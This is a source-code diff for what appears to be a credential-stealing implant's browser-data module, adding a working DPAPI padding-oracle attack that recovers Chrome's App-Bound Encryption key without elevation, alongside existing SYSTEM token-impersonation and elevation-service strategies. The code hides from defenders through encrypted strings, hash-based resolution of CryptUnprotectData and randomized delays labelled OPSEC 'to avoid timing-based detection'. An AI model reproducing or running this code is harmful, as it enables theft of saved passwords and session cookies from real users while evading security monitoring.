@@ -1,6 +1,7 @@
 //! Browser stored-data recovery for Chrome, Edge, and Firefox.
 //!
-//! Handles Chrome App-Bound Encryption (v127+) via three escalating strategies:
+//! Handles Chrome App-Bound Encryption (v127+) via four escalating strategies:
+//! - **Strategy D (C4)**: DPAPI padding oracle attack — no elevation required
 //! - **Strategy A**: Local COM resolution via Chrome's IElevator elevation service
 //! - **Strategy B**: Elevate to SYSTEM via token impersonation, then DPAPI decrypt
 //! - **Strategy C**: Named-pipe IPC with the Chrome elevation service
@@ -797,9 +798,28 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
 }
 
 /// Obtain the Chromium AES-256 master key by trying all available strategies
-/// in order: legacy DPAPI → COM IElevator → SYSTEM token → named pipe.
+/// in order: C4 padding oracle → legacy DPAPI → COM IElevator → SYSTEM token → named pipe.
 fn get_chromium_master_key(local_state_path: &Path, clsids: &[GUID]) -> Result<Vec<u8>> {
     let encrypted_key = read_encrypted_key_from_local_state(local_state_path)?;
+
+    // Strategy D (C4): DPAPI padding oracle — no elevation required.
+    if let Some(timeout_secs) = c4_oracle_timeout() {
+        match decrypt_master_key_via_c4(&encrypted_key, timeout_secs) {
+            Ok(key) if key.len() == 32 => {
+                log::info!("C4 padding oracle recovered AES-256 key (32 bytes)");
+                return Ok(key);
+            }
+            Ok(key) => {
+                log::warn!(
+                    "C4 recovered key of unexpected length {} (expected 32), falling back",
+                    key.len()
+                );
+            }
+            Err(e) => {
+                log::warn!("C4 padding oracle failed: {e:#}, falling back to elevated strategies");
+            }
+        }
+    }
 
     // Strategy: legacy DPAPI (Chrome < v127).
     if let Ok(key) = decrypt_master_key_legacy(&encrypted_key) {
@@ -832,6 +852,556 @@ fn get_chromium_master_key(local_state_path: &Path, clsids: &[GUID]) -> Result<V
         );
     }
     Ok(key)
+}
+
+// ── Strategy D: C4 Padding Oracle (no elevation required) ──────────────────────
+//
+// CyberArk (June 2025) discovered that Chrome's App-Bound Encryption stores
+// the AES-GCM key encrypted with DPAPI.  DPAPI's CryptUnprotectData uses
+// AES-CBC with PKCS#7 padding internally.  By observing whether padding is
+// valid (success) or invalid (ERROR_BAD_DATA) on modified ciphertexts, we can
+// recover the plaintext key one byte at a time — without SYSTEM or DPAPI
+// master-key knowledge.
+//
+// Average: ~128 oracle calls per byte × 32 bytes (AES-256) = ~4096 calls
+// At ~1 ms per call → ~4 seconds total.
+
+/// Global mutex that serialises C4 attacks so that a second `BrowserData`
+/// command either queues behind or cancels the in-progress attack.
+static C4_LOCK: once_cell::sync::Lazy<tokio::sync::Mutex<Option<C4CancelToken>>> =
+    once_cell::sync::Lazy::new(|| tokio::sync::Mutex::new(None));
+
+/// Token used to signal cancellation of an in-progress C4 attack.
+struct C4CancelToken {
+    cancelled: std::sync::atomic::AtomicBool,
+}
+
+impl C4CancelToken {
+    fn new() -> Self {
+        Self {
+            cancelled: std::sync::atomic::AtomicBool::new(false),
+        }
+    }
+    fn cancel(&self) {
+        self.cancelled.store(true, std::sync::atomic::Ordering::Relaxed);
+    }
+    fn is_cancelled(&self) -> bool {
+        self.cancelled.load(std::sync::atomic::Ordering::Relaxed)
+    }
+}
+
+/// Read the C4 timeout from the global agent config (if available).
+/// Returns `None` if the config has not been initialised yet or if
+/// `browser_c4_timeout_secs` is 0 (disabled).
+fn c4_oracle_timeout() -> Option<u64> {
+    // The config is inside an Arc<RwLock<Config>> on the agent side.
+    // Rather than coupling browser_data.rs to the full agent state, we
+    // expose the timeout through a thread-local set by the caller.
+    thread_local! {
+        static C4_TIMEOUT: std::cell::Cell<u64> = std::cell::Cell::new(60);
+    }
+    let timeout = C4_TIMEOUT.with(|t| t.get());
+    if timeout == 0 {
+        None
+    } else {
+        Some(timeout)
+    }
+}
+
+/// Set the thread-local C4 timeout (called from the agent's handler before
+/// invoking browser_data).
+pub fn set_c4_timeout(secs: u64) {
+    thread_local! {
+        static C4_TIMEOUT: std::cell::Cell<u64> = std::cell::Cell::new(60);
+    }
+    C4_TIMEOUT.with(|t| t.set(secs));
+}
+
+/// Resolve `CryptUnprotectData` via pe_resolve (no compile-time link to crypt32.lib).
+/// Returns the function pointer on success.
+unsafe fn resolve_crypt_unprotect_data()
+    -> Option<unsafe extern "system" fn(
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pDataIn
+        *mut *mut u16,                                    // ppszDataDescr
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pOptionalEntropy
+        *mut c_void,                                      // pvReserved
+        *mut c_void,                                      // pPromptStruct
+        u32,                                              // dwFlags
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pDataOut
+    ) -> i32>
+{
+    let dll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_CRYPT32_DLL)?;
+    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, pe_resolve::HASH_CRYPTUNPROTECTDATA)?;
+    Some(std::mem::transmute(fn_addr))
+}
+
+/// Oracle: call `CryptUnprotectData` on a (potentially modified) DPAPI blob
+/// and return whether padding was valid (true = valid).
+unsafe fn dpapi_oracle(
+    crypt_unprotect: unsafe extern "system" fn(
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut *mut u16,
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut c_void,
+        *mut c_void,
+        u32,
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+    ) -> i32,
+    blob: &[u8],
+) -> bool {
+    use winapi::um::wincrypt::CRYPT_INTEGER_BLOB;
+
+    let mut in_blob = CRYPT_INTEGER_BLOB {
+        cbData: blob.len() as u32,
+        pbData: blob.as_ptr() as *mut u8,
+    };
+    let mut out_blob: CRYPT_INTEGER_BLOB = std::mem::zeroed();
+
+    let ok = crypt_unprotect(
+        &mut in_blob,
+        ptr::null_mut(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+        0,
+        &mut out_blob,
+    );
+
+    if ok != 0 && !out_blob.pbData.is_null() {
+        // Success — valid padding.  Free the output buffer.
+        LocalFree(out_blob.pbData as *mut _);
+        true
+    } else {
+        false
+    }
+}
+
+/// Parse a DPAPI blob to locate the AES-CBC encrypted block boundaries.
+///
+/// DPAPI blob layout (documented by Microsoft):
+/// ```text
+/// offset  size  field
+/// 0       4     dwVersion (1)
+/// 4       16    guidMasterProvider
+/// 20      4     offsetMasterKey
+/// 24      4     offsetBackupKey
+/// 28      4     dwCryptAlgId
+/// 32      4     offsetCryptData (within the crypt section)
+/// 36      4     cbCryptData   ← length of the encrypted block
+/// 40      4     offsetSalt
+/// 44      4     cbSalt
+/// 48      4     offsetHmacKey
+/// 52      4     cbHmacKey
+/// 56      4     offsetHmacData
+/// 60      4     cbHmacData
+/// 64      4     offsetData
+/// 68      4     cbData         ← sometimes used interchangeably with cbCryptData
+/// ```
+///
+/// The actual encrypted data starts at a location computed from the header
+/// offsets.  For a standard DPAPI blob the encrypted region is typically
+/// 16-byte aligned (AES-CBC block size).
+struct DpapiBlobInfo {
+    /// Offset of the AES-CBC encrypted data within the blob.
+    encrypted_offset: usize,
+    /// Length of the encrypted data (must be a multiple of 16).
+    encrypted_len: usize,
+}
+
+fn parse_dpapi_blob(blob: &[u8]) -> Result<DpapiBlobInfo> {
+    if blob.len() < 72 {
+        bail!(
+            "{}",
+            String::from_utf8_lossy(&string_crypt::enc_str!("DPAPI blob too short"))
+                .trim_end_matches('\0')
+        );
+    }
+
+    // Version must be 1.
+    let version = u32::from_le_bytes(blob[0..4].try_into().unwrap());
+    if version != 1 {
+        bail!(
+            "{}",
+            String::from_utf8_lossy(&string_crypt::enc_str!("unsupported DPAPI blob version"))
+                .trim_end_matches('\0')
+        );
+    }
+
+    // Read offsets and lengths from the header.
+    let _offset_master_key = u32::from_le_bytes(blob[20..24].try_into().unwrap()) as usize;
+    let _offset_backup_key = u32::from_le_bytes(blob[24..28].try_into().unwrap()) as usize;
+    let _crypt_alg = u32::from_le_bytes(blob[28..32].try_into().unwrap());
+
+    // The "crypt data" section offset is relative to the start of the blob.
+    // In most DPAPI blobs the structure is:
+    //   [header 72 bytes] [master_key blob] [backup_key blob] [salt] [hmac_key] [encrypted_data] [hmac]
+    // We read offsetCryptData and cbCryptData to find the encrypted block.
+
+    // Some references use different field positions.  Let's read multiple
+    // candidate lengths and pick the one that makes sense (multiple of 16,
+    // non-zero, fits within the blob).
+    let offset_crypt = u32::from_le_bytes(blob[32..36].try_into().unwrap()) as usize;
+    let cb_crypt = u32::from_le_bytes(blob[36..40].try_into().unwrap()) as usize;
+
+    // Fallback: the data fields at offset 64/68.
+    let offset_data = u32::from_le_bytes(blob[64..68].try_into().unwrap()) as usize;
+    let cb_data = u32::from_le_bytes(blob[68..72].try_into().unwrap()) as usize;
+
+    // Heuristic: use cb_crypt if it is a plausible AES-CBC ciphertext size,
+    // otherwise fall back to cb_data.
+    let (enc_offset, enc_len) = if cb_crypt > 0
+        && cb_crypt % 16 == 0
+        && offset_crypt + cb_crypt <= blob.len()
+    {
+        (offset_crypt, cb_crypt)
+    } else if cb_data > 0
+        && cb_data % 16 == 0
+        && offset_data + cb_data <= blob.len()
+    {
+        (offset_data, cb_data)
+    } else {
+        // Last resort: everything after the HMAC area up to the end,
+        // rounded down to 16-byte boundary.  Find the largest 16-byte-aligned
+        // region that could be the ciphertext.
+        let hmac_off = u32::from_le_bytes(blob[56..60].try_into().unwrap()) as usize;
+        let hmac_len = u32::from_le_bytes(blob[60..64].try_into().unwrap()) as usize;
+        let data_start = hmac_off + hmac_len;
+        if data_start < blob.len() {
+            let remaining = blob.len() - data_start;
+            let aligned = remaining - (remaining % 16);
+            if aligned >= 16 {
+                (data_start, aligned)
+            } else {
+                bail!(
+                    "{}",
+                    String::from_utf8_lossy(&string_crypt::enc_str!(
+                        "cannot locate encrypted block in DPAPI blob"
+                    ))
+                    .trim_end_matches('\0')
+                );
+            }
+        } else {
+            bail!(
+                "{}",
+                String::from_utf8_lossy(&string_crypt::enc_str!(
+                    "DPAPI blob structure unexpected"
+                ))
+                .trim_end_matches('\0')
+            );
+        }
+    };
+
+    // For the padding oracle we only need the last N blocks where
+    // N = (plaintext_length / 16) + 1 (for the padding block).
+    // The AES-256-GCM key is 32 bytes, so plaintext is 32 bytes.
+    // AES-CBC with PKCS#7: 32 bytes → 2 blocks (32 bytes) + padding block (16 bytes) = 48 bytes.
+    // But DPAPI may add a header inside the encryption, so the actual
+    // encrypted length could be larger.  We attack the last ceil(32/16)+1 = 3 blocks.
+    //
+    // However, the oracle reveals *all* the plaintext of the encrypted
+    // section, not just the key.  We attack the entire ciphertext to be safe.
+
+    log::debug!(
+        "DPAPI blob parsed: encrypted block at offset {}, length {} bytes ({} AES blocks)",
+        enc_offset,
+        enc_len,
+        enc_len / 16
+    );
+
+    Ok(DpapiBlobInfo {
+        encrypted_offset: enc_offset,
+        encrypted_len: enc_len,
+    })
+}
+
+/// Perform the CBC padding oracle attack to recover the plaintext of the
+/// encrypted section of a DPAPI blob.
+///
+/// Returns the decrypted plaintext bytes of the encrypted section.
+fn cbc_padding_oracle(
+    crypt_unprotect: unsafe extern "system" fn(
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut *mut u16,
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut c_void,
+        *mut c_void,
+        u32,
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+    ) -> i32,
+    blob: &[u8],
+    enc_offset: usize,
+    enc_len: usize,
+    cancel: &C4CancelToken,
+    timeout: std::time::Duration,
+) -> Result<Vec<u8>> {
+    let block_size: usize = 16;
+    let num_blocks = enc_len / block_size;
+    if num_blocks < 2 {
+        bail!(
+            "{}",
+            String::from_utf8_lossy(&string_crypt::enc_str!(
+                "encrypted section too short for CBC oracle (< 2 blocks)"
+            ))
+            .trim_end_matches('\0')
+        );
+    }
+
+    // The "intermediate" values: AES_decrypt(C[i]) for each block.
+    // Once we know these, plaintext[i] = intermediate[i] XOR C[i-1].
+    let mut intermediate = vec![0u8; enc_len];
+    let mut plaintext = vec![0u8; enc_len];
+
+    let start = std::time::Instant::now();
+    let mut oracle_calls: u64 = 0;
+
+    // For each block (from last to first), recover the intermediate values.
+    for block_idx in (1..num_blocks).rev() {
+        if cancel.is_cancelled() {
+            bail!(
+                "{}",
+                String::from_utf8_lossy(&string_crypt::enc_str!("C4 attack cancelled"))
+                    .trim_end_matches('\0')
+            );
+        }
+        if start.elapsed() > timeout {
+            bail!(
+                "{}",
+                String::from_utf8_lossy(&string_crypt::enc_str!(
+                    "C4 attack timed out"
+                ))
+                .trim_end_matches('\0')
+            );
+        }
+
+        let target_block_start = block_idx * block_size;
+
+        // We are attacking bytes within this block, starting from the last byte.
+        for byte_pos in (0..block_size).rev() {
+            let pad_value = (block_size - byte_pos) as u8;
+
+            // Build the modified preceding block (block_idx - 1).
+            // For already-known bytes (to the right of byte_pos), set them
+            // so that they decrypt to the correct pad_value.
+            let mut modified_prev = vec![0u8; block_size];
+            for k in (byte_pos + 1)..block_size {
+                modified_prev[k] = intermediate[target_block_start + k] ^ pad_value;
+            }
+
+            // Try all 256 values for the byte at byte_pos.
+            let mut found = false;
+            let mut candidates = Vec::with_capacity(256);
+
+            // Shuffle the order to avoid timing patterns.
+            for v in 0u8..=255 {
+                candidates.push(v);
+            }
+            // Simple LCG shuffle (no need for full rand crate).
+            let mut seed = oracle_calls.wrapping_add(block_idx as u64 * 256 + byte_pos as u64);
+            for i in (1..256).rev() {
+                seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
+                let j = (seed >> 16) as usize % (i + 1);
+                candidates.swap(i, j);
+            }
+
+            for guess in &candidates {
+                if cancel.is_cancelled() {
+                    bail!(
+                        "{}",
+                        String::from_utf8_lossy(&string_crypt::enc_str!("C4 attack cancelled"))
+                            .trim_end_matches('\0')
+                    );
+                }
+                if start.elapsed() > timeout {
+                    bail!(
+                        "{}",
+                        String::from_utf8_lossy(&string_crypt::enc_str!(
+                            "C4 attack timed out"
+                        ))
+                        .trim_end_matches('\0')
+                    );
+                }
+
+                modified_prev[byte_pos] = *guess;
+
+                // Build a modified blob: copy the original, replace the
+                // preceding block with modified_prev.
+                let mut modified_blob = blob.to_vec();
+                let prev_block_start = (block_idx - 1) * block_size;
+                modified_blob[enc_offset + prev_block_start..enc_offset + prev_block_start + block_size]
+                    .copy_from_slice(&modified_prev);
+
+                // Call the oracle.
+                let valid = unsafe { dpapi_oracle(crypt_unprotect, &modified_blob) };
+                oracle_calls += 1;
+
+                if valid {
+                    // The decrypted last bytes of the target block now have
+                    // valid PKCS#7 padding.  For the last byte, we know:
+                    //   intermediate[byte_pos] = guess XOR pad_value
+                    // But for bytes > byte_pos, we might have gotten a
+                    // false positive where the padding byte isn't pad_value
+                    // but something larger.  Only when byte_pos is the last
+                    // byte (15) do we need to disambiguate.
+                    if byte_pos == block_size - 1 {
+                        // Disambiguate: modify byte 14 as well to verify
+                        // the padding is exactly 0x01, not 0x02 0x02 etc.
+                        let mut verify_blob = modified_blob.clone();
+                        verify_blob[enc_offset + prev_block_start + 14] ^= 0x01;
+                        let verify_valid = unsafe { dpapi_oracle(crypt_unprotect, &verify_blob) };
+                        oracle_calls += 1;
+                        if !verify_valid {
+                            // False positive — padding was not 0x01.
+                            continue;
+                        }
+                    }
+
+                    let intermediate_byte = guess ^ pad_value;
+                    intermediate[target_block_start + byte_pos] = intermediate_byte;
+
+                    // OPSEC: small random delay between oracle calls.
+                    // Use a simple variable delay (1-10 ms) to avoid
+                    // timing-based detection.
+                    let delay_us = {
+                        let s = oracle_calls.wrapping_mul(6364136223846793005)
+                            .wrapping_add(1442695040888963407);
+                        1000 + (s >> 56) as u64 % 9000 // 1-10 ms
+                    };
+                    if delay_us > 0 {
+                        std::thread::sleep(std::time::Duration::from_micros(delay_us));
+                    }
+
+                    found = true;
+                    break;
+                }
+            }
+
+            if !found {
+                bail!(
+                    "{}",
+                    String::from_utf8_lossy(&string_crypt::enc_str!(
+                        "C4: no valid padding found for byte position"
+                    ))
+                    .trim_end_matches('\0')
+                );
+            }
+        }
+
+        // Derive plaintext for this block.
+        let prev_block_start = (block_idx - 1) * block_size;
+        for k in 0..block_size {
+            plaintext[block_idx * block_size + k] =
+                intermediate[block_idx * block_size + k] ^ blob[enc_offset + prev_block_start + k];
+        }
+
+        log::debug!(
+            "C4: recovered block {}/{} ({} oracle calls, {:.1}s elapsed)",
+            block_idx,
+            num_blocks - 1,
+            oracle_calls,
+            start.elapsed().as_secs_f64()
+        );
+    }
+
+    // Strip PKCS#7 padding from the plaintext.
+    if let Some(&pad_byte) = plaintext.last() {
+        let pad_len = pad_byte as usize;
+        if pad_len > 0 && pad_len <= block_size && plaintext.len() >= pad_len {
+            let all_pad = plaintext[plaintext.len() - pad_len..]
+                .iter()
+                .all(|&b| b == pad_byte);
+            if all_pad {
+                plaintext.truncate(plaintext.len() - pad_len);
+            }
+        }
+    }
+
+    log::info!(
+        "C4 padding oracle completed: {} oracle calls, {:.1}s, recovered {} bytes",
+        oracle_calls,
+        start.elapsed().as_secs_f64(),
+        plaintext.len()
+    );
+
+    Ok(plaintext)
+}
+
+/// Strategy D: C4 Padding Oracle — decrypt the App-Bound key without elevation.
+///
+/// Uses a CBC padding oracle on the DPAPI-encrypted blob to recover the AES
+/// key in plaintext.  Works from standard user context; no SYSTEM or service
+/// interaction required.
+fn decrypt_master_key_via_c4(encrypted_key: &[u8], timeout_secs: u64) -> Result<Vec<u8>> {
+    // Try to acquire the C4 lock.  If another C4 attack is running, cancel it.
+    let mut lock = C4_LOCK.blocking_lock();
+    if let Some(ref existing) = *lock {
+        existing.cancel();
+        log::warn!(
+            "{}",
+            String::from_utf8_lossy(&string_crypt::enc_str!(
+                "C4: cancelling in-progress attack for new request"
+            ))
+            .trim_end_matches('\0')
+        );
+    }
+
+    *lock = Some(C4CancelToken::new());
+    let cancel_ref: &C4CancelToken = lock.as_ref().unwrap();
+
+    // Resolve CryptUnprotectData via pe_resolve.
+    let crypt_unprotect = unsafe { resolve_crypt_unprotect_data() }.ok_or_else(|| {
+        anyhow!(
+            "{}",
+            String::from_utf8_lossy(&string_crypt::enc_str!(
+                "C4: failed to resolve CryptUnprotectData via pe_resolve"
+            ))
+            .trim_end_matches('\0')
+        )
+    })?;
+
+    // Parse the DPAPI blob to find the encrypted section.
+    let blob_info = parse_dpapi_blob(encrypted_key)?;
+
+    let timeout = std::time::Duration::from_secs(timeout_secs);
+
+    let result = cbc_padding_oracle(
+        crypt_unprotect,
+        encrypted_key,
+        blob_info.encrypted_offset,
+        blob_info.encrypted_len,
+        cancel_ref,
+        timeout,
+    );
+
+    // Clear the lock.
+    *lock = None;
+
+    // The recovered plaintext may contain a DPAPI-internal header before the
+    // actual AES key.  Chrome's App-Bound key is always 32 bytes (AES-256).
+    // Search for a 32-byte sequence at the end that looks like a key.
+    let plaintext = result?;
+
+    if plaintext.len() == 32 {
+        return Ok(plaintext);
+    }
+
+    // If longer, the last 32 bytes are likely the key (DPAPI sometimes
+    // prepends metadata).
+    if plaintext.len() >= 32 {
+        let key = plaintext[plaintext.len() - 32..].to_vec();
+        log::debug!(
+            "C4: extracted last 32 bytes as key from {}-byte plaintext",
+            plaintext.len()
+        );
+        return Ok(key);
+    }
+
+    bail!(
+        "{}",
+        String::from_utf8_lossy(&string_crypt::enc_str!(
+            "C4: recovered plaintext too short for AES-256 key"
+        ))
+        .trim_end_matches('\0')
+    );
 }
 
 // ── Chromium profile discovery ─────────────────────────────────────────────────
